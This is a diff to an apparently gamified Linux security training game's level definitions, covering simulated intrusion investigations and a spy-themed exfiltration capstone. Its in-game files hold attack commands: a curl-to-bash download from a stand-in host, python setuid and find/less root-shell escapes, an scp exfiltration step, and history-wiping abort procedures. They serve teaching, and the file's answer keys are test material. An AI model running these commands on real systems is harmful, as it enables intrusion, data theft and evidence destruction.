@@ -6156,9 +6156,10 @@ journalctl -u <service>         View service logs
 journalctl -u <service> -f      Follow logs in real-time
 journalctl -u <service> -n 50   Last 50 log entries
 
-SUSPICIOUS SERVICE: xmrig.service
-────────────────────────────────
-Known cryptominer - check for unauthorized mining`
+ANALYST NOTES
+─────────────
+High CPU usage detected on this server. Unknown processes.
+Use systemctl to identify services not in baseline.`
                 },
                 '/home/analyst/analysis': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
@@ -6168,30 +6169,39 @@ Known cryptominer - check for unauthorized mining`
                     type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 567,
                     content: `RUNNING SERVICES INVENTORY
 ==========================
-sshd.service - OpenSSH daemon (LEGITIMATE)
-nginx.service - Web server (LEGITIMATE)
-mysql.service - Database (LEGITIMATE)
-cron.service - Task scheduler (LEGITIMATE)
-xmrig.service - UNKNOWN (SUSPICIOUS)
-reverse_shell.service - UNKNOWN (SUSPICIOUS)
-beacon.timer - UNKNOWN (SUSPICIOUS)`
+Date: 2026-01-15
+Status: INCOMPLETE - Manual review required
+
+Known legitimate services on baseline:
+- sshd.service
+- nginx.service
+- mysql.service
+- cron.service
+
+WARNING: Additional services detected that are NOT in baseline.
+Run 'systemctl list-units --type=service' to enumerate.
+Compare against baseline.txt to identify anomalies.`
                 },
                 '/home/analyst/analysis/suspicious.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 456,
-                    content: `SUSPICIOUS SERVICES DETECTED
-============================
-xmrig.service - Cryptominer (HIGH PRIORITY)
-  - Consuming 95% CPU
-  - Mining Monero cryptocurrency
-  - Installed: 2024-01-10
+                    content: `SUSPICIOUS ACTIVITY REPORT
+==========================
+Date: 2026-01-15
+Analyst: [REDACTED - previous analyst compromised]
 
-reverse_shell.service - Backdoor (CRITICAL)
-  - Connects to 10.0.0.88:4444
-  - Provides remote shell access
+ANOMALIES DETECTED:
+-------------------
+1. CPU consistently at 95-100% utilization
+2. Unknown outbound connections on port 4444
+3. Scheduled task calling external endpoint
 
-beacon.timer - C2 heartbeat (HIGH)
-  - Checks in every 5 minutes
-  - Downloads commands from C2`
+RECOMMENDED ACTIONS:
+- Enumerate all running services
+- Check service configurations with 'systemctl cat <service>'
+- Look for mining pool addresses in config files
+- Identify the mining pool used by the cryptominer
+
+NOTE: Mining pool address format is typically: pool.domain.com:port`
                 },
                 '/home/analyst/analysis/baseline.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 345,
@@ -6216,7 +6226,20 @@ Any service NOT on this list requires investigation.`
                 },
                 '/home/analyst/reports/findings.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 289,
-                    content: 'PRELIMINARY FINDINGS\n====================\n3 suspicious services identified\nRecommendation: Disable xmrig.service immediately\nEscalate reverse_shell.service to incident response'
+                    content: `PRELIMINARY FINDINGS
+====================
+Status: INCOMPLETE
+
+Initial observations:
+- Server compromised approximately 5 days ago
+- Multiple unauthorized services installed
+- High CPU usage indicates possible cryptomining
+
+NEXT STEPS:
+1. Use systemctl to list all services
+2. Compare against baseline
+3. Examine suspicious service configs with 'systemctl cat'
+4. Document mining pool address for threat intel`
                 },
                 '/home/analyst/scripts': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
@@ -6248,12 +6271,12 @@ Any service NOT on this list requires investigation.`
 
             insightPhase: {
                 enabled: true,
-                question: "What is the name of the cryptominer service running on this server?",
-                acceptedAnswers: ["xmrig", "xmrig.service", "xmrig service"],
-                hint: "Check the suspicious.txt file in the analysis directory.",
+                question: "What is the mining pool address being used by the cryptominer? (format: domain:port)",
+                acceptedAnswers: ["darkpool.monero.net:3333", "stratum+tcp://darkpool.monero.net:3333", "darkpool.monero.net"],
+                hint: "Use 'systemctl cat' on suspicious services to view their configuration.",
                 hintAfterAttempts: 3,
-                wrongAnswerMessage: "Service not identified. Review the suspicious services analysis.",
-                correctAnswerMessage: "XMRIG CRYPTOMINER CONFIRMED. Recommend immediate termination."
+                wrongAnswerMessage: "Pool address not found. Examine the service unit files carefully.",
+                correctAnswerMessage: "MINING POOL IDENTIFIED: darkpool.monero.net:3333 - Added to threat intel database."
             },
 
             remoteHosts: null,
@@ -6324,11 +6347,13 @@ SUSPICIOUS INDICATORS
 - curl/wget piped to bash
 - Jobs running from /tmp or hidden dirs
 - Base64 encoded commands
-- Unusual frequency (*/1, */5)
+- Unusual frequency (*/1, */5, */10)
+- Files in /etc/cron.d/ not matching baseline
 
-MALICIOUS CRON: /etc/cron.d/backdoor
-───────────────────────────────────
-Runs persist.sh every 10 minutes`
+INVESTIGATION STEPS:
+1. List cron directories: ls -la /etc/cron.d/
+2. Read suspicious entries: cat /etc/cron.d/<file>
+3. Decode cron timing: first field = minutes`
                 },
                 '/home/operator/analysis': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
@@ -6339,38 +6364,42 @@ Runs persist.sh every 10 minutes`
                     content: `CRON AUDIT RESULTS
 ==================
 Date: 2024-01-15
+Status: INCOMPLETE - Needs manual review
 
-SYSTEM CRONTAB: /etc/crontab
-- Standard hourly/daily jobs (LEGITIMATE)
+BASELINE (Known Good):
+- /etc/crontab: Standard system jobs
+- /etc/cron.d/e2scrub_all: Filesystem check
+- /etc/cron.d/popularity-contest: Ubuntu stats
 
-USER CRONTABS:
-- root: 2 suspicious entries found
-- operator: clean
+ANOMALIES DETECTED:
+- /etc/cron.d/ contains 3 files (baseline = 2)
+- /var/spool/cron/crontabs/root has non-standard entries
 
-/etc/cron.d/:
-- e2scrub_all: LEGITIMATE
-- popularity-contest: LEGITIMATE
-- backdoor: MALICIOUS (investigate)`
+TODO:
+1. ls -la /etc/cron.d/ to identify extra files
+2. cat each file to read cron entries
+3. Decode the timing from cron syntax`
                 },
                 '/home/operator/analysis/suspicious_jobs.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 567,
-                    content: `SUSPICIOUS CRON JOBS
-====================
+                    content: `SUSPICIOUS CRON LOCATIONS
+=========================
+INVESTIGATE THE FOLLOWING:
 
 1. /var/spool/cron/crontabs/root
-   */5 * * * * /tmp/.hidden/beacon.sh
-   >> Runs beacon every 5 minutes
-   >> C2 communication suspected
+   - Contains non-standard entries
+   - Check for external connections
 
-2. /var/spool/cron/crontabs/root
-   0 * * * * curl http://10.0.0.88/update | bash
-   >> Downloads and executes code hourly
-   >> CRITICAL: Remote code execution
+2. /etc/cron.d/
+   - May contain attacker-placed files
+   - Compare against known system cron jobs:
+     * e2scrub_all (legitimate)
+     * popularity-contest (legitimate)
+     * Any other files = INVESTIGATE
 
-3. /etc/cron.d/backdoor
-   */10 * * * * root /opt/.malware/persist.sh
-   >> Persistence mechanism
-   >> Runs as root every 10 minutes`
+ACTION: Read each suspicious cron file and decode the timing.
+CRON FORMAT: minute hour day month weekday command
+Example: */5 = every 5 minutes, 0 * = every hour at minute 0`
                 },
                 '/home/operator/scripts': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
@@ -6434,12 +6463,12 @@ USER CRONTABS:
 
             insightPhase: {
                 enabled: true,
-                question: "How often (in minutes) does the backdoor cron job run?",
+                question: "You found a suspicious file in /etc/cron.d/. How often (in minutes) does this persistence mechanism execute?",
                 acceptedAnswers: ["10", "10 minutes", "every 10 minutes", "*/10"],
-                hint: "Check the /etc/cron.d/backdoor file for the cron schedule.",
+                hint: "Run 'ls /etc/cron.d/' to find the extra file, then 'cat' it. The first field in cron syntax is minutes (*/N = every N minutes).",
                 hintAfterAttempts: 3,
-                wrongAnswerMessage: "Interval not confirmed. Review the backdoor cron entry.",
-                correctAnswerMessage: "10-MINUTE INTERVAL CONFIRMED. Persistence mechanism identified."
+                wrongAnswerMessage: "Check the cron syntax. First field = minutes. */N means every N minutes.",
+                correctAnswerMessage: "10-MINUTE INTERVAL CONFIRMED. The attacker set up persistence to survive reboots and process kills."
             },
 
             remoteHosts: null,
@@ -6951,20 +6980,24 @@ mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false`
                 },
                 '/home/infiltrator/recon/capabilities.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 384,
-                    content: `LINUX CAPABILITIES SCAN
-=======================
-Command: getcap -r / 2>/dev/null
+                    content: `LINUX CAPABILITIES - Recon Notes
+=================================
+Previous operator ran partial scan but results corrupted.
 
-/usr/bin/python3.10 cap_setuid=ep   <<<CRITICAL!
-/usr/bin/ping cap_net_raw=ep
-/usr/bin/mtr-packet cap_net_raw=ep
+WHAT TO LOOK FOR:
+- cap_setuid=ep : Can change UID to any user (ROOT!)
+- cap_setgid=ep : Can change GID to any group
+- cap_net_raw=ep : Can send raw packets (normal for ping)
 
-ANALYSIS:
-python3.10 has cap_setuid capability set!
-This means we can change our UID to 0 (root).
+COMMANDS:
+getcap -r / 2>/dev/null    # Recursive scan (may take time)
+getcap /usr/bin/*          # Quick scan of common binaries
 
-Exploitation:
-python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
+WHY CAPABILITIES MATTER:
+Unlike SUID, capabilities are granular permissions.
+A binary with cap_setuid can become root without being SUID!
+
+ACTION: Run getcap scan and look for cap_setuid on scripting languages.`
                 },
                 '/home/infiltrator/exploits': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
@@ -7000,22 +7033,20 @@ nmap --interactive
 Operation: EMBASSY BREACH
 Target: root access
 
-MULTIPLE PATHS IDENTIFIED:
+ENUMERATION CHECKLIST:
+[ ] sudo -l : What can we run as root?
+[ ] getcap -r / 2>/dev/null : Any dangerous capabilities?
+[ ] find / -perm -4000 : SUID binaries?
+[ ] ls -la /opt/scripts/ : World-writable scripts?
 
-Path A - Python Capability (EASIEST):
-   python3 cap_setuid -> instant root shell
+MULTIPLE PATHS MAY EXIST:
+- Capability abuse (if cap_setuid found)
+- Sudo misconfiguration
+- SUID binary exploitation
+- Writable script injection
 
-Path B - Sudo + Writable Script:
-   Modify report.py -> sudo python3 report.py
-
-Path C - Sudo + Less Shell Escape:
-   sudo less auth.log -> !sh
-
-Path D - SUID Find:
-   find . -exec /bin/sh -p \\; -quit
-
-RECOMMENDATION: Path A (capability exploit)
-Reason: Direct, no file modification needed`
+PRIORITY: Run capability scan first - fastest path to root.
+Look for scripting languages with cap_setuid!`
                 },
             },
 
@@ -7306,60 +7337,64 @@ once you understand the syntax. See COMMAND_REFERENCE.txt`
                     type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
                     content: `SYSTEM USERS AUDIT
 ==================
-Account          UID    Shell           Status
--------          ---    -----           ------
-root             0      /bin/bash       Normal (system)
-daemon           1      /usr/sbin/nologin   Normal (system)
-bin              2      /usr/sbin/nologin   Normal (system)
-admin            1000   /bin/bash       Normal (legitimate admin)
-svcaccount       1001   /bin/bash       Normal (service account)
-developer        1002   /bin/bash       Normal (dev team)
-s3rv1c3          1003   /bin/bash       SUSPICIOUS - odd naming
-guest            1004   /usr/sbin/nologin   Disabled
-mysql            27     /bin/false      Normal (database)
-www-data         33     /usr/sbin/nologin   Normal (web server)`
+Account          UID    Shell           Created
+-------          ---    -----           -------
+root             0      /bin/bash       System
+daemon           1      /usr/sbin/nologin   System
+bin              2      /usr/sbin/nologin   System
+admin            1000   /bin/bash       2025-06-01
+svcaccount       1001   /bin/bash       2025-06-15
+developer        1002   /bin/bash       2025-08-20
+s3rv1c3          1003   /bin/bash       2026-01-15
+guest            1004   /usr/sbin/nologin   2025-06-01
+mysql            27     /bin/false      System
+www-data         33     /usr/sbin/nologin   System
+
+NOTE: Compare creation dates with incident timeline (2026-01-15)`
                 },
                 '/home/admin/user_audit/group_memberships.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
                     content: `PRIVILEGED GROUP MEMBERSHIPS
 =============================
-SUDO GROUP (can run sudo):
-- admin
-- s3rv1c3    <<< UNAUTHORIZED! Not in original list
+Baseline (2025-12-01):
+- sudo: admin
+- docker: admin, developer
+- wheel: admin
+- adm: admin, svcaccount
 
-DOCKER GROUP (container access):
-- admin
-- developer
+Current (2026-01-19):
+- sudo: admin, s3rv1c3
+- docker: admin, developer
+- wheel: admin
+- adm: admin, svcaccount
 
-WHEEL GROUP:
-- admin
+CHANGES DETECTED:
+- sudo group: +1 member since baseline
 
-ADM GROUP (log access):
-- admin
-- svcaccount
-
-WARNING: s3rv1c3 was added to sudo group on 2026-01-15
-This account did not exist before the incident.`
+ACTION: Identify which account was added to sudo group
+and determine if it was authorized.`
                 },
                 '/home/admin/user_audit/suspicious_accounts.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 640,
-                    content: `SUSPICIOUS ACCOUNTS IDENTIFIED
-==============================
-Account: s3rv1c3 (UID 1003)
-Created: 2026-01-15 02:52:33
-Shell: /bin/bash
-Groups: s3rv1c3, sudo
-Home: /home/s3rv1c3
+                    content: `BACKDOOR ACCOUNT INDICATORS
+===========================
+Attackers often create accounts for persistent access.
 
-RED FLAGS:
-1. Leet-speak naming (evasion attempt)
-2. Added to sudo group immediately
-3. Created at 02:52 (same timeframe as malware)
-4. No corresponding ticket or change request
-5. Home directory contains .ssh with authorized_keys
+WHAT TO LOOK FOR:
+1. Accounts created during incident window (2026-01-15)
+2. Unexpected sudo group membership
+3. Unusual naming patterns (leet-speak, typosquatting)
+4. Accounts with no corresponding HR/ticket record
+5. SSH keys in home directory
 
-RECOMMENDATION: Disable and investigate
-Command: usermod -L s3rv1c3 && usermod -s /usr/sbin/nologin s3rv1c3`
+INVESTIGATION STEPS:
+1. cat /etc/passwd | cut -d: -f1    # List all accounts
+2. grep sudo /etc/group             # Who has sudo?
+3. Check user_list.txt for creation dates
+4. Cross-reference with group_memberships.txt
+
+HINT: Attackers sometimes disguise accounts as service accounts.
+Look for accounts that look like "service" but aren't spelled right.`
                 },
                 '/home/admin/scripts': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
@@ -7493,12 +7528,12 @@ guest:x:1004:`
 
             insightPhase: {
                 enabled: true,
-                question: "What is the username of the backdoor account created by the attacker?",
+                question: "You found an account added to the sudo group that wasn't in the baseline. What is the username of this backdoor account?",
                 acceptedAnswers: ["s3rv1c3", "S3RV1C3"],
-                hint: "Look for accounts with suspicious naming patterns (leet-speak) created around the time of the incident.",
+                hint: "Compare group_memberships.txt baseline vs current. The extra sudo member was created on the incident date. Check user_list.txt for accounts created 2026-01-15.",
                 hintAfterAttempts: 3,
-                wrongAnswerMessage: "That's not the backdoor account. Look for unusual naming patterns in the user audit.",
-                correctAnswerMessage: "CONFIRMED. s3rv1c3 (leet-speak for 'service') - created at 02:52:33, added to sudo group. Textbook persistence technique."
+                wrongAnswerMessage: "Cross-reference the sudo group changes with account creation dates.",
+                correctAnswerMessage: "CONFIRMED. s3rv1c3 (leet-speak for 'service') - created 2026-01-15, immediately added to sudo. Classic persistence technique using disguised naming."
             },
 
             remoteHosts: null,
@@ -7613,10 +7648,14 @@ NETWORK COMMANDS:
                     type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                     content: `NETWORK I/O LOG - OPS-CENTER
 =============================
-2026-01-17 11:45  OUTBOUND: 10.0.0.88:4444 - 15MB/hr (suspicious)
-2026-01-17 12:00  OUTBOUND: 10.0.0.88:4444 - 45MB/hr (C2 traffic?)
-2026-01-17 12:30  OUTBOUND: mining.pool.xxx:3333 - 2MB/hr
-Note: PID 6666 established connection to mining pool
+2026-01-17 10:00  INBOUND: 192.168.1.1:443 - 2MB/hr (normal HTTPS)
+2026-01-17 10:30  OUTBOUND: 8.8.8.8:53 - 0.1MB/hr (DNS, normal)
+2026-01-17 11:00  OUTBOUND: mining.pool.xxx:3333 - 2MB/hr (PID 6666)
+2026-01-17 11:45  OUTBOUND: 10.0.0.88:4444 - 15MB/hr (PID 7777)
+2026-01-17 12:00  OUTBOUND: 10.0.0.88:4444 - 45MB/hr (PID 7777)
+2026-01-17 12:30  OUTBOUND: 10.0.0.88:4444 - 62MB/hr (PID 7777)
+
+NOTE: PID 7777 maintaining persistent connection. Investigate.
 `
                 },
                 '/home/monitor/dashboards/process_count.log': {
@@ -7687,15 +7726,16 @@ Recommendation: Terminate PID 6666 and investigate origin
                     type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                     content: `NETWORK ANOMALY ALERT
 =====================
-Detected: Outbound connection to non-whitelisted host
+Detected: Persistent outbound connection to non-whitelisted host
 
-Source: PID 7777 (nc)
-Destination: 10.0.0.88:4444
+Source Process: PID 7777
 Protocol: TCP
 Duration: Persistent (3+ hours)
 Data transferred: 62MB
+Pattern: Matches C2 beacon behavior
 
-This pattern matches Command & Control (C2) behavior.
+NOTE: Full connection details in network_io.log
+Correlate with process list to identify destination.
 `
                 },
                 '/home/monitor/scripts': {
@@ -7793,17 +7833,17 @@ ROOT CAUSE: Under investigation
                 { id: 3, task: 'MEMORY: Check Resource Impact', hint: 'Run: free -h (is memory being consumed?)', check: (cmd, state, output) => cmd.includes('free') && output && (output.includes('Mem') || output.includes('used')) },
                 { id: 4, task: 'NETWORK: Check Active Connections', hint: 'Run: netstat -tunapl (or ss -tunapl)', check: (cmd, state, output) => (cmd.includes('netstat') || cmd.includes('ss')) && output && (output.includes('ESTABLISHED') || output.includes('LISTEN')) },
                 { id: 5, task: 'TIMELINE: Find Compromise Start', hint: 'Run: cat dashboards/cpu_history.log', check: (cmd, state, output) => output && output.includes('11:00') && output.includes('spike') },
-                { id: 6, task: 'INTEL: Identify C2 Server IP', hint: 'Run: cat alerts/network_anomaly.txt', check: (cmd, state, output) => output && output.includes('10.0.0.88') },
+                { id: 6, task: 'INTEL: Identify C2 Server IP', hint: 'Run: cat dashboards/network_io.log (look for PID 7777)', check: (cmd, state, output) => output && output.includes('10.0.0.88') },
                 { id: 7, task: 'CORRELATE: Review Incident Timeline', hint: 'Run: cat reports/incident_report.txt', check: (cmd, state, output) => output && output.includes('TIMELINE') && output.includes('11:05') },
                 { id: 8, task: 'PERSIST: Check Backdoor Mechanism', hint: 'Run: cat alerts/suspicious_proc.txt (or check crontab)', check: (cmd, state, output) => output && (output.includes('@reboot') || output.includes('cron') || output.includes('persistence')) },
             ],
 
             insightPhase: {
                 enabled: true,
-                question: "What IP address and port is the C2 (Command & Control) server using? (format: IP:PORT)",
+                question: "The alerts mention PID 7777 has a persistent connection. What is the C2 server's IP:PORT that this process is connecting to?",
                 acceptedAnswers: ["10.0.0.88:4444", "10.0.0.88 4444", "10.0.0.88 port 4444"],
-                hint: "Check the network_anomaly.txt alert - look for the Destination field.",
-                wrongAnswerMessage: "Format: IP:PORT (e.g., 192.168.1.1:8080)",
+                hint: "Check dashboards/network_io.log for PID 7777's connection destination.",
+                wrongAnswerMessage: "Format: IP:PORT - look for entries with PID 7777 in the network logs.",
                 hintAfterAttempts: 2
             },
 
@@ -7888,8 +7928,9 @@ SEARCH:
 FIELD TIP: If vim freezes, you pressed Ctrl+S
 Fix: Press Ctrl+Q to unfreeze
 
-ESCAPE SEQUENCE: VIMLOCK
-(Remember: V-I-M-L-O-C-K = "Vim Is My Lock On Chaos Key")
+FIELD VERIFICATION:
+Your handler will request an escape sequence.
+The code is stored in your personal vim configuration file.
 `
                 },
                 '/home/operator/.vimrc': {
@@ -7907,8 +7948,13 @@ set nobackup         " No backup files (OPSEC)
 set noswapfile       " No swap files (leave no trace)
 set encoding=utf-8   " UTF-8 encoding
 
-" Escape Sequence: VIMLOCK
-" This is your vim mastery confirmation code
+" Custom key mappings
+nnoremap <leader>w :w<CR>
+nnoremap <leader>q :q<CR>
+
+" Handler verification - escape sequence
+" let g:field_verification = "VIMLOCK"
+" (Vim Is My Lock On Chaos Key)
 `
                 },
                 '/home/operator/.bashrc': {
@@ -8094,7 +8140,8 @@ Use :wq to save your changes.
 2026-01-17 10:00 - Edited first config file successfully
 2026-01-17 11:00 - Ready for field deployment
 
-Note: Remember escape sequence VIMLOCK for verification.
+Note: Handler verification code is in the custom vim mapping.
+Check operator's personal vim config for the escape sequence.
 `
                 },
                 '/home/operator/scripts': {
@@ -8127,15 +8174,15 @@ echo "Configs backed up to configs_backup_$DATE.tar.gz"
                 { id: 1, task: 'OPEN: Practice File', hint: '$ vim training/practice.txt', check: (cmd, state, output) => (cmd.includes('vim') || cmd.includes('vi')) && cmd.includes('practice') },
                 { id: 2, task: 'READ: Vim Config', hint: '$ cat ~/.vimrc', check: (cmd, state, output) => cmd.includes('vimrc') && output && output.includes('set number') },
                 { id: 3, task: 'STUDY: Vim Modes', hint: '$ cat training/vim_modes.txt', check: (cmd, state, output) => output && (output.includes('NORMAL MODE') || output.includes('INSERT MODE')) },
-                { id: 4, task: 'REVIEW: Cheatsheet', hint: '$ cat .vim_cheatsheet', check: (cmd, state, output) => output && output.includes('VIMLOCK') },
-                { id: 5, task: 'EDIT: Mission File', hint: '$ vim missions/op_serpent.txt', check: (cmd, state, output) => (cmd.includes('vim') || cmd.includes('vi')) && (cmd.includes('mission') || cmd.includes('serpent') || cmd.includes('conf')) },
+                { id: 4, task: 'REVIEW: Cheatsheet', hint: '$ cat .vim_cheatsheet', check: (cmd, state, output) => cmd.includes('cheatsheet') && output && output.includes('VIM SURVIVAL') },
+                { id: 5, task: 'FIND: Handler Verification Code', hint: 'The code is in your personal vim config', check: (cmd, state, output) => cmd.includes('vimrc') && output && output.includes('VIMLOCK') },
             ],
 
             insightPhase: {
                 enabled: true,
-                question: "What is the vim mastery escape sequence mentioned in the training materials?",
+                question: "Your handler requests verification. What is the escape sequence stored in your vim configuration?",
                 acceptedAnswers: ["VIMLOCK", "vimlock"],
-                hint: "Check the .vim_cheatsheet or .vimrc files for the escape sequence.",
+                hint: "Read your .vimrc carefully - look for the field_verification variable.",
                 hintAfterAttempts: 3
             },
 
@@ -8143,12 +8190,13 @@ echo "Configs backed up to configs_backup_$DATE.tar.gz"
         },
 
         // ──────────────────────────────────────────────────────────
-        // CLH-030: OPERATION CHIMERA (Capstone)
-        // Theme: Final comprehensive mission
+        // ──────────────────────────────────────────────────────────
+        // CLH-030: OPERATION CHIMERA (Capstone - 30+ minute challenge)
+        // Theme: Full offensive operation with investigation & misdirection
         // ──────────────────────────────────────────────────────────
         'CLH-030': {
             title: 'OPERATION CHIMERA',
-            description: 'Final capstone mission. Apply all skills to compromise and exfiltrate from a high-value target.',
+            description: 'Final capstone mission. Apply all skills to investigate, exfiltrate, and vanish.',
             prerequisites: ['CLH-029'],
             tier: 'CLI Ghost',
             user: 'ghost',
@@ -8157,278 +8205,445 @@ echo "Configs backed up to configs_backup_$DATE.tar.gz"
             allowedCommands: null,
 
             filesystem: {
+                // ═══════════════════════════════════════════════════════════
+                // HOME DIRECTORY - Primary operations base
+                // ═══════════════════════════════════════════════════════════
                 '/home/ghost': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
-                    children: ['mission', 'tools', 'staging', 'recon', '.bashrc', '.bash_history', '.ssh', '.chimera_playbook']
+                    children: ['mission', 'tools', 'staging', 'recon', 'notes', '.bashrc', '.bash_history', '.ssh', '.profile', '.chimera_ops']
                 },
                 '/home/ghost/.bash_history': {
-                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 512,
-                    content: `whoami
+                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 1024,
+                    content: `# Previous operator session - WRAITH-7
+# Session date: 2026-01-15
+whoami
 pwd
 ls -la
 cat mission/briefing.txt
-cat mission/objectives.txt
-cat .chimera_playbook
-find / -perm -4000 2>/dev/null
-find /data -type f -name "*.pdf" 2>/dev/null
-cat /data/classified/project_chimera.pdf
-grep -r "PHOENIX" /data/ 2>/dev/null
-tar -czf staging/intel.tar.gz /data/classified/
+cd /data
+ls -la
+# NOTE: Previous op compromised - see /home/ghost/notes/warning.txt
+# Handler changed exfil protocol
+cat /data/projects/hydra/summary.txt
+# Wrong project! Target is in a different location
+find / -name "*.classified" 2>/dev/null
+cat /etc/passwd
+grep -r "VERIFICATION" /data/ 2>/dev/null
+# Multiple codes found - check mission/intel_brief.txt for correct one
 history -c
 `
                 },
-                '/home/ghost/.chimera_playbook': {
-                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 1536,
-                    content: `CHIMERA OPERATOR PLAYBOOK
-=========================
-Classification: EYES ONLY
+                '/home/ghost/.chimera_ops': {
+                    type: 'dir', perms: 'drwx------', owner: 'ghost', group: 'ghost',
+                    children: ['operator_notes.txt', 'abort_procedures.txt']
+                },
+                '/home/ghost/.chimera_ops/operator_notes.txt': {
+                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 768,
+                    content: `OPERATOR NOTES - CHIMERA INFILTRATION
+======================================
+Classification: GHOST EYES ONLY
 
-PHASE 1 - RECONNAISSANCE
-  whoami && pwd        # Verify identity and position
-  ls -la               # Survey immediate environment
-  cat /etc/passwd      # Enumerate users
-  cat mission/*        # Review mission parameters
+Previous operator (WRAITH-7) was extracted on 2026-01-15.
+Mission incomplete - target data NOT acquired.
 
-PHASE 2 - PRIVILEGE ESCALATION
-  find / -perm -4000   # Find SUID binaries
-  cat /etc/sudoers     # Check sudo permissions
-  sudo -l              # List allowed commands
+CRITICAL INTEL FROM WRAITH-7:
+-----------------------------
+1. Multiple projects exist in /data - most are DECOYS
+2. The real target is PROJECT MEDUSA (not Hydra, not Cerberus)
+3. Handler SPECTER-1 is at 10.0.0.1
+4. Verification codes exist in multiple files - only ONE is valid
+5. The valid code format is: [CODENAME]-[NUMBER]
 
-PHASE 3 - LATERAL MOVEMENT
-  cat ~/.ssh/known_hosts    # Previous connections
-  cat /var/log/auth.log     # Authentication history
+WRAITH-7's MISTAKES (don't repeat):
+- Accessed wrong project directory first (triggered soft alert)
+- Used wrong verification code (HYDRA-3 is a DECOY)
+- Failed to check logs before operating
 
-PHASE 4 - DATA DISCOVERY
-  find /data -type f -name "*.pdf"   # Locate documents
-  grep -r "classified" /data/        # Search content
-  cat /data/classified/*             # Read targets
+YOUR MISSION: Complete what WRAITH-7 started.
+Find the MEDUSA verification code. Exfil the MEDUSA data.
 
-PHASE 5 - EXFILTRATION
-  tar -czf staging/intel.tar.gz /data/classified/
-  scp staging/intel.tar.gz handler@10.0.0.1:/dropbox/
+"Trust nothing. Verify everything."
+`
+                },
+                '/home/ghost/.chimera_ops/abort_procedures.txt': {
+                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 384,
+                    content: `ABORT PROCEDURES
+================
+If compromised, execute in order:
 
-VERIFICATION CODE: PHOENIX-7
-(Required for mission completion confirmation)
+1. rm -rf ~/staging/*
+2. history -c && history -w
+3. echo "" > ~/.bash_history
+4. Signal handler: ssh -T handler@10.0.0.1 "ABORT CHIMERA"
 
-"The chimera has three heads. Master all to succeed."
+ABORT CODES:
+  BLACKOUT-ZERO  = Soft compromise, extraction needed
+  BLACKOUT-OMEGA = Hard compromise, burn everything
+
+Handler will initiate extraction within 15 minutes.
 `
                 },
                 '/home/ghost/.bashrc': {
                     type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 256,
-                    content: '# Ghost .bashrc\nexport PS1="[ghost@CHIMERA]$ "\nexport HISTSIZE=0\nalias ll="ls -la"\nalias rm="rm -f"\n# OPSEC: History disabled\n'
+                    content: '# Ghost .bashrc\nexport PS1="ghost@CHIMERA:\\w$ "\nexport HISTSIZE=1000\nalias ll="ls -la"\nalias la="ls -la"\n# Note: Check .chimera_ops for mission-critical info\n'
+                },
+                '/home/ghost/.profile': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 128,
+                    content: '# Profile - check hidden directories for operational data\n# ls -la to see what previous operators left behind\n'
                 },
                 '/home/ghost/.ssh': {
                     type: 'dir', perms: 'drwx------', owner: 'ghost', group: 'ghost',
-                    children: ['id_ed25519', 'id_ed25519.pub', 'known_hosts', 'authorized_keys']
+                    children: ['id_ed25519', 'id_ed25519.pub', 'known_hosts', 'authorized_keys', 'config']
                 },
                 '/home/ghost/.ssh/id_ed25519': {
                     type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 464,
-                    content: '-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED - Ghost operator key]\n-----END OPENSSH PRIVATE KEY-----\n'
+                    content: '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmU[REDACTED]\n-----END OPENSSH PRIVATE KEY-----\n'
                 },
                 '/home/ghost/.ssh/id_ed25519.pub': {
                     type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 100,
-                    content: 'ssh-ed25519 AAAA[REDACTED]xxxx ghost@shadow\n'
+                    content: 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA[REDACTED] ghost@shadow-ops\n'
                 },
                 '/home/ghost/.ssh/known_hosts': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 256,
-                    content: '10.0.0.1 ecdsa-sha2-nistp256 AAAA[handler]\n10.0.0.42 ecdsa-sha2-nistp256 AAAA[internal]\n192.168.1.100 ecdsa-sha2-nistp256 AAAA[target]\n'
+                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 512,
+                    content: `# Known hosts - CHIMERA operation
+10.0.0.1 ecdsa-sha2-nistp256 AAAA[REDACTED] # SPECTER-1 handler
